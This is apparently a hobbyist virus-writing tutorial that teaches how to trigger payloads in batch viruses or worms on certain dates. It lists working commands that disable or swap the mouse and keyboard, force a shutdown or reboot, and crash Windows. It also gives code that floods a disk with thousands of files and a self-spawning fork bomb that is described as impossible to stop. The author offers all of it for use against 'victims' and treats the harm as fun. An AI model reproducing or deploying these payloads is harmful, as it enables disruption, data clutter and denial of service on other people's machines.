		(3) - Mouse payloads
		(4) - Shutdown/reboot payloads
		(5) - Other Payloads
		(6) - Conclusion
		
1) Introduction:

	I'm not very good at talking, so let me say only two thinks as introduction: 
	in this article you'll find some funny payloads, much of these are taken
	from my BoM. if you found anything interesting you can use it as you wish,
	but just one think: everything that will happen will be on your own
	responsability. Ok, now, stop talking: let's code.

2) Payloads activation:

	If you want to run a payload in your batch virus/worm, firstly you have to
	decide its activation (or trigger). You can activate a payload:

	a) On every batch run: this is very simple. Just place the payload code
	into your batch, so it will be executed everytime you batch run.
	
	b) On a specific day: this mode will execute the payload if the virus will
	be run during the specified day. Here an example, that shows a message if 
	the batch is executed during the 16 of every month:
	
		echo.|date|find "16">nul
		if not errorlevel 1 echo I'M THE PAYLOAD!

	if you have a longer payload, it will be easy too:

		echo.|date|find "16">nul
		if not errorlevel 1 goto payload_end
		:: place here your payload code...
		:payload_end

	c) On a specific month: this mode will execute the payload every day of the
	specified month. Here an example, that shows a message if the batch gets
	executed during the month of august (it's the same way as specific day):

		echo.|date|find "08">nul
		if not errorlevel 1 echo I'M THE PAYLOAD!

	of course, we have a problem: if the date contains the "08" string, even if
	it isn't the month, the payload will be executed. Anyway, i don't think that
	this is a big problem so... who cares?

	d) On a specific date: of course you can also execute your payloads on a
	specific date, like a partial or complete date. Two examples:
	
		echo.|date|find "04/11">nul
		if not errorlevel 1 echo I'M THE PAYLOAD!

		echo.|date|find "04/11/2003">nul
		if not errorlevel 1 echo I'M THE PAYLOAD!

3) Mouse payloads:
	
	Here some funny payloads about the mouse (remember that these payloads will
	work only on Windows 9x and WindowsME!)

	a) Swap mouse buttons: it's very simple. just an executable that runs an
	API function from a predefined DLL. Here the code:

		rundll32.exe user,swapmousebutton

	b) Disable the mouse: also very easy. Work as the previous. Here the code:

		rundll32.exe mouse,disable

	c) Move the mouse: Also this is very simple, it move the cursor into the top
	of the left part of the screen. Here the code:
	
		rundll32.exe user,setcursorpos
	
	Note: the "crazy floppy" payload (from my BoM) use this RUNDLL32 call into
	a VBScript, to make a good result: it make an infinite loop and call the
	function. The result is that the victim will go crazy, and probably will
	turn off the computer. Funny, isnt it?

4) Shutdown/reboot payloads:

	Also very easy to understand, here some funny strings of code that you
	MUST know!

	a) Shutdown the computer: Ther are three common ways:

	- Normal Shutdown (for Windows 9x and WindowsME only):

		rundll32.exe user,exitwindows

	- Forced Shutdown (for Windows 9x and WindowsME only):

		rundll32.exe krnl386,exitkernel

	- Forced Shutdown (for Windows XP only):

		shutdown.exe -s -f

	b) Reboot the computer: Ther are two common ways:

	- Normal Reboot (for Windows 9x and WindowsME only):

		rundll32.exe shell32,shexitwindowsex 2

	- Forced Reboot (for Windows XP only):

		shutdown.exe -f -r

5) Other Payloads:

	Now some other misc payloads, also very easy and funny!
	
	a) Disable the keyboard: it's like the "disable mouse", look:

		rundll32.exe keyboard,disable

	b) Windows crash (for Windows 9x and WindowsME only):

		rundll32.exe user,disableoemlayer

	c) Refresh the screen (for Windows 9x and WindowsME only):

		rundll32.exe user,repaintscreen

	Note: the "crazy screen" payload (from my BoM) use this RUNDLL32 call into
	a VBScript, to make a good result: it make an infinite loop and call the
	function. The result is that the victim will go crazy, and probably will
	turn off the computer. Funny, isnt it?

	d) Open a specific URL: It's very simple. Just execute the "explorer.exe"
	file and pass as parameter the specific URL. An example:

		explorer.exe http://www.google.com

	Note with "explorer.exe" you can also open directories, and every file
	that could be opened by the "Internet Explorer." Some examples:

		explorer.exe C:\Windows
		:: the above opens the windows dir.

		explorer.exe C:\image.jpg
		:: the above opens the image with Internet Explorer

		explorer.exe C:\page.html
		:: the above opens the HTML file with Internet Explorer

	e) Create thousands of files:
	This code uses a DOS bug into the "for" command, to copy a
	file into thousands of new files. the creation will not
	end until the batch will be closed. If executed every day,
	it becames very problematic! Here an example:
	
		echo some shit!> C:\shit.tmp
		for %%a in (*.*) do copy C:\shit.tmp %%aX

	Note: the "X" after the "%%a" could be every string, but it's necessary!

	f) A very cool crash payload:
	This is a very powerful payload, discovered by my friend Hostfat, wich
	inspired the "Infinite loop crash" from my BoM. It creates a batch file
	and execute it; this batch opens a new window with itself and continue
	running like an infinite loop. The result is that hundred of windows
	will be opended 'till the system will crash. It's impossible to stop
	(tested in all windows platforms!). Very funny. Now, the original code:

		echo start /m %%0>>crash.bat
		echo %%0>>crash.bat
		start /m crash.bat

6) Conclusion:
	
	These payloads are only a little part of what you can do with batch.
	If you are interested on something more difficult, download the last
	version of my BoM from my site: http://sad1cpage.supereva.it
 	If you want to tell/ask me something, mail me at: sad1c@interfree.it
	Well, that's it. Hope you had some fun!
